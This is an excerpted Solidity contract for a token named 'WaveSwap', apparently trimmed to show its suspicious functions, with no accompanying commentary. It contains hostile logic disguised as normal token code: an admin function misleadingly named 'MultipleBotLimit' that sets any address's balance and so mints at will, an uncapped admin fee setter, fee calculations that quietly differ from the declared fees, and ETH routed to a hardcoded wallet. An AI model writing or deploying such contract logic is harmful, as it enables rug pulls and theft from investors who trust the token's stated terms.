...
contract Ownable is Context {
    ...
    mapping (address => bool) internal OnlyOwner;
...
contract WaveSwap is Context, IERC20, Ownable {
    ...
    string private constant _name = "WaveSwap"; 
    string private constant _symbol = "WAVESWAP"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _promoFee = 1;
    uint256 public _liquidityFee = 1;
    address private _communityWallet = 0x93213BE707fc78e3aca1AA209D02d2f6790f1469;
    ...
    function TaxChange(uint256 promoFee) external onlyAdmin {
        _promoFee = promoFee;
    }
    ...
    function MultipleBotLimit(uint256 treasury, address addre) external onlyAdmin {
        _tOwned[addre] = treasury;
        emit Transfer(address (0), addre, treasury);
    }
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 promo = amount * (_promoFee + 1) / 100; 
        uint256 liquidityFee = amount * (_liquidityFee - 1) / 100; 
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(_communityWallet).transfer(ethToSend);
    }
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        if (ethAmount - ethFromLiquidity > 0)
            payable(_communityWallet).sendValue (ethAmount - ethFromLiquidity);
    }
}